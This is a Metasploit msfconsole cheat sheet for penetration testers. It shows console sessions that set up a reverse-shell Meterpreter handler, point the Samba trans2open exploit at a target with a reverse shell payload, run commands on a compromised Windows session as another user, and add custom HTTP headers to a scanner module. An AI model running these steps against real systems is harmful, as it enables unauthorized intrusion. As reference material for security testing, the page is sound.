---
tags: [shell,snmp]
---
# msfconsole

=== Info
- **Description**: command line (CLI) interpreter of metasploit framework (msf).
- Version tested: 5.x.x, 6.2.21-dev
- Initial review date: 30/07/2019
- Last update date: 20/11/2022
- [Source](https://github.com/rapid7/metasploit-framework)
- [Rawsec Inventory](https://inventory.raw.pm/tools.html#Metasploit)
===

## Handler

Basic attached multi handler:

```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.11.0.204
LHOST => 10.11.0.204
msf5 exploit(multi/handler) > set LPORT 57896
LPORT => 57896
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.0.204:57896
```

## Example of SNMP modules

```
msf >  search snmp

Matching Modules
================

   Name                                               Disclosure Date  Rank    Description
   ----                                               ---------------  ----    -----------
   auxiliary/scanner/misc/oki_scanner                                  normal  OKI Printer Default Login Credential Scanner
   auxiliary/scanner/snmp/aix_version                                  normal  AIX SNMP Scanner Auxiliary Module
   auxiliary/scanner/snmp/cisco_config_tftp                            normal  Cisco IOS SNMP Configuration Grabber (TFTP)
   auxiliary/scanner/snmp/cisco_upload_file                            normal  Cisco IOS SNMP File Upload (TFTP)
   auxiliary/scanner/snmp/snmp_enum                                    normal  SNMP Enumeration Module
   auxiliary/scanner/snmp/snmp_enumshares                              normal  SNMP Windows SMB Share Enumeration
   auxiliary/scanner/snmp/snmp_enumusers                               normal  SNMP Windows Username Enumeration
   auxiliary/scanner/snmp/snmp_login                                   normal  SNMP Community Scanner
   auxiliary/scanner/snmp/snmp_set                                     normal  SNMP Set Module
   auxiliary/scanner/snmp/xerox_workcentre_enumusers                   normal  Xerox WorkCentre User Enumeration (SNMP)
   exploit/windows/ftp/oracle9i_xdb_ftp_unlock        2003-08-18       great   Oracle 9i XDB FTP UNLOCK Overflow (win32)
   exploit/windows/http/hp_nnm_ovwebsnmpsrv_main      2010-06-16       great   HP OpenView Network Node Manager ovwebsnmpsrv.exe main Buffer Overflow
   exploit/windows/http/hp_nnm_ovwebsnmpsrv_ovutil    2010-06-16       great   HP OpenView Network Node Manager ovwebsnmpsrv.exe ovutil Buffer Overflow
   exploit/windows/http/hp_nnm_ovwebsnmpsrv_uro       2010-06-08       great   HP OpenView Network Node Manager ovwebsnmpsrv.exe Unrecognized Option Buffer Overflow
   exploit/windows/http/hp_nnm_snmp                   2009-12-09       great   HP OpenView Network Node Manager Snmp.exe CGI Buffer Overflow
   exploit/windows/http/hp_nnm_snmpviewer_actapp      2010-05-11       great   HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow
   post/windows/gather/enum_snmp
```

## Change of payload

```
msf5 exploit(linux/samba/trans2open) > show payloads

Compatible Payloads
===================

   #   Name                                      Disclosure Date  Rank    Check  Description
   -   ----                                      ---------------  ----    -----  -----------
   1   generic/custom                                             normal  No     Custom Payload
   2   generic/debug_trap                                         normal  No     Generic x86 Debug Trap
   3   generic/shell_bind_tcp                                     normal  No     Generic Command Shell, Bind TCP Inline
   4   generic/shell_reverse_tcp                                  normal  No     Generic Command Shell, Reverse TCP Inline
   5   generic/tight_loop                                         normal  No     Generic x86 Tight Loop
   6   linux/x86/adduser                                          normal  No     Linux Add User
   7   linux/x86/chmod                                            normal  No     Linux Chmod
   8   linux/x86/exec                                             normal  No     Linux Execute Command
   9   linux/x86/meterpreter/bind_ipv6_tcp                        normal  No     Linux Mettle x86, Bind IPv6 TCP Stager (Linux x86)
   10  linux/x86/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   11  linux/x86/meterpreter/bind_nonx_tcp                        normal  No     Linux Mettle x86, Bind TCP Stager
   12  linux/x86/meterpreter/bind_tcp                             normal  No     Linux Mettle x86, Bind TCP Stager (Linux x86)
   13  linux/x86/meterpreter/bind_tcp_uuid                        normal  No     Linux Mettle x86, Bind TCP Stager with UUID Support (Linux x86)
   14  linux/x86/meterpreter/reverse_ipv6_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager (IPv6)
   15  linux/x86/meterpreter/reverse_nonx_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager
   16  linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
   17  linux/x86/meterpreter/reverse_tcp_uuid                     normal  No     Linux Mettle x86, Reverse TCP Stager
   18  linux/x86/metsvc_bind_tcp                                  normal  No     Linux Meterpreter Service, Bind TCP
   19  linux/x86/metsvc_reverse_tcp                               normal  No     Linux Meterpreter Service, Reverse TCP Inline
   20  linux/x86/read_file                                        normal  No     Linux Read File
   21  linux/x86/shell/bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind IPv6 TCP Stager (Linux x86)
   22  linux/x86/shell/bind_ipv6_tcp_uuid                         normal  No     Linux Command Shell, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   23  linux/x86/shell/bind_nonx_tcp                              normal  No     Linux Command Shell, Bind TCP Stager
   24  linux/x86/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager (Linux x86)
   25  linux/x86/shell/bind_tcp_uuid                              normal  No     Linux Command Shell, Bind TCP Stager with UUID Support (Linux x86)
   26  linux/x86/shell/reverse_ipv6_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager (IPv6)
   27  linux/x86/shell/reverse_nonx_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager
   28  linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
   29  linux/x86/shell/reverse_tcp_uuid                           normal  No     Linux Command Shell, Reverse TCP Stager
   30  linux/x86/shell_bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind TCP Inline (IPv6)
   31  linux/x86/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline
   32  linux/x86/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline
   33  linux/x86/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
   34  linux/x86/shell_reverse_tcp_ipv6                           normal  No     Linux Command Shell, Reverse TCP Inline (IPv6)

msf5 exploit(linux/samba/trans2open) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf5 exploit(linux/samba/trans2open) > show options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.0.0.1         yes       The target address range or CIDR identifier
   RPORT   139              yes       The target port (TCP)


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.0.254       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce
```

## List sessions

```
sessions -l

Active sessions
===============

  Id  Name  Type                     Information                Connection
  --  ----  ----                     -----------                ----------
  3         meterpreter x86/windows  hosname\user @ netbios  10.0.0.254:57896 -> 10.0.0.1:50994 (10.0.0.1)
```

## Run a command as another user on Windows

```
msf5 exploit(multi/handler) > use post/windows/manage/run_as
msf5 post(windows/manage/run_as) > set CMD whoami
CMD => whoami
msf5 post(windows/manage/run_as) > set CMDOUT true
CMDOUT => true
msf5 post(windows/manage/run_as) > set PASSWORD mypwd
PASSWORD => mypwd
msf5 post(windows/manage/run_as) > set USER alice
USER => alice
msf5 post(windows/manage/run_as) > set SESSION 3
SESSION => 3
msf5 post(windows/manage/run_as) > set DOMAIN .
DOMAIN => .
msf5 post(windows/manage/run_as) > run

[*] Executing CreateProcessWithLogonW...
[+] Process started successfully, PID: 4388
[*] Command Run: cmd.exe /c whoami > C:\Windows\Temp\NuhelUOR.txt
[*] Command output:
hostname\alice

[*] Removing temp file C:\Windows\Temp\NuhelUOR.txt
[*] Post module execution completed
```

## Set HTTP headers

Let's say you want to run the `auxiliary/scanner/http/title` module with the following
configuration.

```
msf6 auxiliary(scanner/http/title) > options

Module options (auxiliary/scanner/http/title):

   Name         Current Setting                                     Required  Description
   ----         ---------------                                     --------  -----------
   Proxies                                                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       54.186.210.202 54.188.216.194                       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        443                                                 yes       The target port (TCP)
   SHOW_TITLES  true                                                yes       Show the titles on the console as they are grabbed
   SSL          true                                                no        Negotiate SSL/TLS for outgoing connections
   STORE_NOTES  true                                                yes       Store the captured information in notes. Use "notes -t http.title" to view
   TARGETURI    /                                                   yes       The base path
   THREADS      1                                                   yes       The number of concurrent threads (max one per host)
   VHOST        301207a9dbaa3720bf085a6329977d5b.ctf.hacker101.com  no        HTTP server virtual host
```

But you want an authenticated scan so you need to provide a Cookie or an authentication bearer. In MSF 6 you'll have to configure the _Advanced_ option `HttpRawHeaders`.

`HttpRawHeaders` have been added to all major branches.

- MSF 6.2.27:
   - [lib/msf/core/exploit/remote/http_client.rb](https://github.com/rapid7/metasploit-framework/blob/29a4546b0760369028491b8fe98ebb343444f6bf/lib/msf/core/exploit/remote/http_client.rb#L35-L53)
   - [docs/metasploit-framework.wiki/Metasploit-Guide-HTTP.md](https://github.com/rapid7/metasploit-framework/blob/6.2.27/docs/metasploit-framework.wiki/Metasploit-Guide-HTTP.md?plain=1#L137-L160)
- MSF 5.0.101:
   - [lib/msf/core/exploit/http/client.rb](https://github.com/rapid7/metasploit-framework/blob/2382d7530cf0cf2aa4ac63be30c98ca3fcdd6bbf/lib/msf/core/exploit/http/client.rb#L33-L51)
- MSF 4.17.103:
   - [lib/msf/core/exploit/http/client.rb](https://github.com/rapid7/metasploit-framework/blob/f957f1f58b3effa2603e93f4dff46c4adee695c8/lib/msf/core/exploit/http/client.rb#L33-L49)

The official description is the following:

> Path to ERB-templatized raw headers to append to existing headers

This means you have to provide a path to a file containing HTTP headers like in a raw HTTP request or in Burp Suite.

For example, `/tmp/headers.txt`:

```http
Cookie: session=556cc23863fef20fab5c456db166bc6e
X-Custom-Name: noraj
Authorization: Bearer AbCdEf123456
```

To see what's happening let's configure an upstream proxy to MSF.

```
msf6 auxiliary(scanner/http/title) > set Proxies http:127.0.0.1:8080
Proxies => http:127.0.0.1:8080
```

Then, run the module without `HttpRawHeaders`. Here is what we have in Burp Suite proxy.

```http
GET / HTTP/2
Host: 301207a9dbaa3720bf085a6329977d5b.ctf.hacker101.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
```

Now set the file with raw HTTP headers:

```
msf6 auxiliary(scanner/http/title) > set HttpRawHeaders /tmp/headers.txt
HttpRawHeaders => /tmp/headers.txt
```

Note: I had a bug when using both `Proxies` and `HttpRawHeaders` that prevented the module to work correctly.
So instead let's use a request bin without proxy.

```
msf6 auxiliary(scanner/http/title) > unset Proxies
Unsetting Proxies...
msf6 auxiliary(scanner/http/title) > set VHOST msf.requestcatcher.com
VHOST => msf.requestcatcher.com
msf6 auxiliary(scanner/http/title) > set RHOSTS 104.248.184.153
RHOSTS => 104.248.184.153
```

We receive a request with the 3 extra headers we added:

```http
GET / HTTP/1.1
Host: msf.requestcatcher.com
Authorization: Bearer AbCdEf123456
Cookie: session=556cc23863fef20fab5c456db166bc6e
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
X-Custom-Name: noraj
```

But you remember the description said _ERB-templatized raw headers_, it means we can do more powerful stuff.

Basically, we can add [ERB templating](https://github.com/ruby/erb) into the raw headers file to perform some dynamic logic.

Now replace the file with this basic templating to use a small loop:

```erb
Cookie: session=556cc23863fef20fab5c456db166bc6e<% for i in 0..5 do %>
X-Custom-Name: noraj-<%= i %><% end %>
Authorization: Bearer AbCdEf123456
```

Here is what we are receiving:

```http
GET / HTTP/1.1
Host: msf.requestcatcher.com
Authorization: Bearer AbCdEf123456
Cookie: session=556cc23863fef20fab5c456db166bc6e
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
X-Custom-Name: noraj-0
X-Custom-Name: noraj-1
X-Custom-Name: noraj-2
X-Custom-Name: noraj-3
X-Custom-Name: noraj-4
X-Custom-Name: noraj-5
```
